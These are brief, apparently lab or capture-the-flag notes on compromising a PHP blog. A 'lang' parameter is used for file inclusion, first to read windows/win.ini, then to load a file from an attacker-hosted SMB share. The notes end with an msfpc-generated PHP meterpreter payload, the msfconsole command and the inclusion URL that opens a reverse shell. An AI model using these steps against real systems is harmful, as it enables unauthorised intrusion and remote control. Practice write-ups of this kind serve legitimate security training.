the site had a link for language and we tried ?lang=windows/win.ini it showed us the content

so next we tried responder but no use

so we did smb to connect and we were successful

```
mkdir /tmp/share
echo aa > test in /tmp/share
service smdb start
?lang=\\10.10.14.64\share\test.txt
```

we got our text back

==msfpc== php 10.10.14.9

it generated a code which we pasted on link and got shell

msfconsole -q -r '/root/php-meterpreter-staged-reverse-tcp-443-php.rc'

[http://10.129.1.171/blog/?lang=\\10.10.14.64\share\php-meterpreter-staged-reverse-tcp-443.php](http://10.129.1.171/blog/?lang=%5C%5C10.10.14.64%5Cshare%5Cphp-meterpreter-staged-reverse-tcp-443.php)
